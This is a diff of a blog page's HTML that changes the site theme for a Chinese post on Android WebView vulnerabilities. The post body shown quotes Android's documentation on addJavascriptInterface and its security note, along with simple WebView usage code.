@@ -1,23 +1,11 @@
-
-
 <!DOCTYPE html>
-<html lang="en" data-default-color-scheme=auto>
-
-
-
+<html lang=en>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="henices">
-  <meta name="keywords" content="">
-  
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
     <meta name="description" content="☆ 来自 developer.android.com 的信息Android 官方网站对addJavascriptInterface的介绍如下： 123456789101112public void addJavascriptInterface (Object object, String name)  Added in API level 1Injects the supplied Java ob">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Android WebView 漏洞">
@@ -30,310 +18,175 @@
 <meta property="article:author" content="henices">
 <meta property="article:tag" content="Security">
 <meta property="article:tag" content="Android">
-<meta name="twitter:card" content="summary_large_image">
-  
-  
-    <meta name="referrer" content="no-referrer-when-downgrade">
-  
-  
-  <title>Android WebView 漏洞 - 安全代码</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Android WebView 漏洞</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
 
 
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+    <!-- Umami Analytics -->
 
 
-<link  rel="stylesheet" href="/css/main.css" />
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="https://www.usmacd.com/rss.xml" title="安全代码" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/cn/Windows_Rx034/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/cn/vnc/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://usmacd.com/cn/webview_java/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://usmacd.com/cn/webview_java/&text=Android WebView 漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://usmacd.com/cn/webview_java/&title=Android WebView 漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://usmacd.com/cn/webview_java/&is_video=false&description=Android WebView 漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Android WebView 漏洞&body=Check out this article: http://usmacd.com/cn/webview_java/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://usmacd.com/cn/webview_java/&title=Android WebView 漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://usmacd.com/cn/webview_java/&title=Android WebView 漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://usmacd.com/cn/webview_java/&title=Android WebView 漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://usmacd.com/cn/webview_java/&title=Android WebView 漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://usmacd.com/cn/webview_java/&name=Android WebView 漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://usmacd.com/cn/webview_java/&t=Android WebView 漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
 
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E6%9D%A5%E8%87%AA-developer-android-com-%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">☆ 来自 developer.android.com 的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">☆ 相关知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebView%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">WebView的使用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Reflection"><span class="toc-number">2.2.</span> <span class="toc-text">Java Reflection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87reflection-%E8%AE%BF%E9%97%AEprivate"><span class="toc-number">2.3.</span> <span class="toc-text">通过reflection 访问private</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">☆  相关漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2013-4710"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2013-4710</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2012-6636-%E5%85%B3%E9%94%AE%E7%9A%84CVE"><span class="toc-number">3.2.</span> <span class="toc-text">CVE-2012-6636  (关键的CVE)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean"><span class="toc-number">3.3.</span> <span class="toc-text">CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2014-7224"><span class="toc-number">3.4.</span> <span class="toc-text">CVE-2014-7224</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.5.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text">☆ 漏洞检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">5.</span> <span class="toc-text">☆ 漏洞利用的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95%E5%92%8C%E7%8E%B0%E7%8A%B6"><span class="toc-number">6.</span> <span class="toc-text">☆ 修复方法和现状</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">7.</span> <span class="toc-text">☆ 参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%86-%E6%80%9D%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">☆ 思考</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
 
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"usmacd.com","root":"/","version":"1.9.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
-<meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
-<link rel="alternate" href="/rss.xml" title="安全代码" type="application/rss+xml">
-</head>
-
-
-<body>
-  
-
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
   <header>
     
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Android WebView 漏洞
+    </h1>
 
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>安全代码</strong>
-    </a>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">henices</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-09-06T03:00:51.896Z" class="dt-published" itemprop="datePublished">2023-09-06</time>
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
-                <i class="iconfont icon-home-fill"></i>
-                <span>Home</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>Archives</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>Tags</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
-                <i class="iconfont icon-user-fill"></i>
-                <span>About</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/" target="_self">
-                <i class="iconfont icon-link-fill"></i>
-                <span>Links</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/rss.xml" target="_self">
-                <i class="iconfont icon-rss"></i>
-                <span>rss</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/sitemap.xml" target="_self">
-                
-                <span>sitemap</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
+      
     </div>
-  </div>
-</nav>
 
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Android/" rel="tag">Android</a>, <a class="p-category" href="/tags/Security/" rel="tag">Security</a>
+    </div>
+
+
+    </div>
+  </header>
   
 
-<div id="banner" class="banner" parallax=true
-     style="background: url('https://images.unsplash.com/photo-1473181488821-2d23949a045a?w=640') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle">Android WebView 漏洞</span>
-          
-        </div>
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="☆-来自-developer-android-com-的信息"><a href="#☆-来自-developer-android-com-的信息" class="headerlink" title="☆ 来自 developer.android.com 的信息"></a>☆ 来自 developer.android.com 的信息</h2><p>Android 官方网站对addJavascriptInterface的介绍如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public void addJavascriptInterface (Object object, String name)  Added in API level 1</span><br><span class="line"></span><br><span class="line">Injects the supplied Java object into this WebView. The object is injected into</span><br><span class="line">the JavaScript context of the main frame, using the supplied name. This allows </span><br><span class="line">the Java object&#x27;s methods to be accessed from JavaScript. For applications</span><br><span class="line">targeted to API level JELLY_BEAN_MR1 and above, only public methods that are </span><br><span class="line">annotated with JavascriptInterface can be accessed from JavaScript. For applications</span><br><span class="line">targeted to API level JELLY_BEAN or below, all public methods (including the inherited ones)</span><br><span class="line">can be accessed, see the important security note below for implications.</span><br><span class="line"></span><br><span class="line">Note that injected objects will not appear in JavaScript until the page is next</span><br><span class="line">(re)loaded. For example:</span><br></pre></td></tr></table></figure>
 
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-06 11:00" pubdate>
-          September 6, 2023 am
-        </time>
-      </span>
-    
-  </div>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">   <span class="meta">@JavascriptInterface</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="string">&quot;injectedObject&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(), <span class="string">&quot;injectedObject&quot;</span>);</span><br><span class="line">webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">webView.loadUrl(<span class="string">&quot;javascript:alert(injectedObject.toString())&quot;</span>);</span><br></pre></td></tr></table></figure>
 
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          1.7k words
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          15 mins
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="busuanzi_container_page_pv" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="busuanzi_value_page_pv"></span> views
-        </span>
-        
-      
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">Android WebView 漏洞</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <h2 id="☆-来自-developer-android-com-的信息"><a href="#☆-来自-developer-android-com-的信息" class="headerlink" title="☆ 来自 developer.android.com 的信息"></a>☆ 来自 developer.android.com 的信息</h2><p>Android 官方网站对addJavascriptInterface的介绍如下：</p>
-<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">public</span> void addJavascriptInterface (<span class="hljs-type">Object</span> <span class="hljs-type">object</span>, <span class="hljs-type">String</span> name)  Added <span class="hljs-keyword">in</span> API level <span class="hljs-number">1</span><br><br>Injects the supplied Java <span class="hljs-type">object</span> <span class="hljs-keyword">into</span> this WebView. The <span class="hljs-type">object</span> <span class="hljs-built_in">is</span> injected <span class="hljs-keyword">into</span><br>the JavaScript context <span class="hljs-keyword">of</span> the main frame, <span class="hljs-keyword">using</span> the supplied name. This allows <br>the Java <span class="hljs-type">object</span><span class="hljs-comment">&#x27;s methods to be accessed from JavaScript. For applications</span><br>targeted <span class="hljs-keyword">to</span> API level JELLY_BEAN_MR1 <span class="hljs-built_in">and</span> above, only <span class="hljs-keyword">public</span> methods that are <br>annotated <span class="hljs-keyword">with</span> JavascriptInterface can be accessed <span class="hljs-keyword">from</span> JavaScript. <span class="hljs-keyword">For</span> applications<br>targeted <span class="hljs-keyword">to</span> API level JELLY_BEAN <span class="hljs-built_in">or</span> below, all <span class="hljs-keyword">public</span> methods (including the inherited ones)<br>can be accessed, see the important security note below <span class="hljs-keyword">for</span> implications.<br><br>Note that injected objects will <span class="hljs-built_in">not</span> appear <span class="hljs-keyword">in</span> JavaScript <span class="hljs-keyword">until</span> the page <span class="hljs-built_in">is</span> <span class="hljs-keyword">next</span><br>(re)loaded. <span class="hljs-keyword">For</span> example:<br></code></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JsObject</span> &#123;<br>   <span class="hljs-meta">@JavascriptInterface</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;injectedObject&quot;</span>; &#125;<br>&#125;<br><br>webView.addJavascriptInterface(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JsObject</span>(), <span class="hljs-string">&quot;injectedObject&quot;</span>);<br>webView.loadData(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;text/html&quot;</span>, <span class="hljs-literal">null</span>);<br>webView.loadUrl(<span class="hljs-string">&quot;javascript:alert(injectedObject.toString())&quot;</span>);<br></code></pre></td></tr></table></figure>
-
-<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">This method can be used <span class="hljs-keyword">to</span> allow JavaScript <span class="hljs-keyword">to</span> control the host application. <br>This <span class="hljs-built_in">is</span> a powerful feature, but also presents a security risk <span class="hljs-keyword">for</span> apps targeting<br>JELLY_BEAN <span class="hljs-built_in">or</span> earlier. Apps that target a version later than JELLY_BEAN are still<br>vulnerable <span class="hljs-keyword">if</span> the app runs <span class="hljs-keyword">on</span> a device running Android earlier than <span class="hljs-number">4.2</span>. The <br>most secure way <span class="hljs-keyword">to</span> use this method <span class="hljs-built_in">is</span> <span class="hljs-keyword">to</span> target JELLY_BEAN_MR1 <span class="hljs-built_in">and</span> <span class="hljs-keyword">to</span> ensure the<br>method <span class="hljs-built_in">is</span> called only <span class="hljs-keyword">when</span> running <span class="hljs-keyword">on</span> Android <span class="hljs-number">4.2</span> <span class="hljs-built_in">or</span> later. <span class="hljs-keyword">With</span> these older <br>versions, JavaScript could use reflection <span class="hljs-keyword">to</span> access an injected <span class="hljs-type">object</span><span class="hljs-comment">&#x27;s public</span><br>fields. Use <span class="hljs-keyword">of</span> this method <span class="hljs-keyword">in</span> a WebView containing untrusted content could allow<br>an attacker <span class="hljs-keyword">to</span> manipulate the host application <span class="hljs-keyword">in</span> unintended ways, executing <br>Java code <span class="hljs-keyword">with</span> the permissions <span class="hljs-keyword">of</span> the host application. Use extreme care <span class="hljs-keyword">when</span> <br><span class="hljs-keyword">using</span> this method <span class="hljs-keyword">in</span> a WebView which could contain untrusted content.<br>JavaScript interacts <span class="hljs-keyword">with</span> Java <span class="hljs-type">object</span> <span class="hljs-keyword">on</span> a <span class="hljs-keyword">private</span>, background thread <span class="hljs-keyword">of</span> this <br>WebView. Care <span class="hljs-built_in">is</span> therefore required <span class="hljs-keyword">to</span> maintain thread safety.<br><br>The Java <span class="hljs-type">object</span><span class="hljs-comment">&#x27;s fields are not accessible.</span><br><span class="hljs-keyword">For</span> applications targeted <span class="hljs-keyword">to</span> API level LOLLIPOP <span class="hljs-built_in">and</span> above, methods <span class="hljs-keyword">of</span> injected <br>Java objects are enumerable <span class="hljs-keyword">from</span> JavaScript. Parameters <span class="hljs-type">object</span> the Java <span class="hljs-type">object</span> <br><span class="hljs-keyword">to</span> inject <span class="hljs-keyword">into</span> this WebView<span class="hljs-comment">&#x27;s JavaScript context. Null values are ignored.</span><br>name  the name used <span class="hljs-keyword">to</span> expose the <span class="hljs-type">object</span> <span class="hljs-keyword">in</span> JavaScript<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">This method can be used to allow JavaScript to control the host application. </span><br><span class="line">This is a powerful feature, but also presents a security risk for apps targeting</span><br><span class="line">JELLY_BEAN or earlier. Apps that target a version later than JELLY_BEAN are still</span><br><span class="line">vulnerable if the app runs on a device running Android earlier than 4.2. The </span><br><span class="line">most secure way to use this method is to target JELLY_BEAN_MR1 and to ensure the</span><br><span class="line">method is called only when running on Android 4.2 or later. With these older </span><br><span class="line">versions, JavaScript could use reflection to access an injected object&#x27;s public</span><br><span class="line">fields. Use of this method in a WebView containing untrusted content could allow</span><br><span class="line">an attacker to manipulate the host application in unintended ways, executing </span><br><span class="line">Java code with the permissions of the host application. Use extreme care when </span><br><span class="line">using this method in a WebView which could contain untrusted content.</span><br><span class="line">JavaScript interacts with Java object on a private, background thread of this </span><br><span class="line">WebView. Care is therefore required to maintain thread safety.</span><br><span class="line"></span><br><span class="line">The Java object&#x27;s fields are not accessible.</span><br><span class="line">For applications targeted to API level LOLLIPOP and above, methods of injected </span><br><span class="line">Java objects are enumerable from JavaScript. Parameters object the Java object </span><br><span class="line">to inject into this WebView&#x27;s JavaScript context. Null values are ignored.</span><br><span class="line">name  the name used to expose the object in JavaScript</span><br></pre></td></tr></table></figure>
 
 <p>  之所以提供addJavascriptInterface是为了WebView中的Javascript可以和本地的App<br>  通讯，这确实是一个很强大的功能，这么做的好处在于本地App逻辑不变的情况下，不<br>  需要升级App就可以对程序进行更新，修改相应的Web页面就可以了。</p>
 <h2 id="☆-相关知识"><a href="#☆-相关知识" class="headerlink" title="☆ 相关知识"></a>☆ 相关知识</h2><h3 id="WebView的使用方法"><a href="#WebView的使用方法" class="headerlink" title="WebView的使用方法"></a>WebView的使用方法</h3><p>  在layout中定义 <webview>, 在Activity的onCreate中加入下面的代码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebView</span> <span class="hljs-variable">webview</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebView</span>(<span class="hljs-built_in">this</span>);<br>setContentView(webview);<br>webview.loadUrl(<span class="hljs-string">&quot;http://slashdot.org/&quot;</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>);</span><br><span class="line">setContentView(webview);</span><br><span class="line">webview.loadUrl(<span class="string">&quot;http://slashdot.org/&quot;</span>);</span><br></pre></td></tr></table></figure>
 
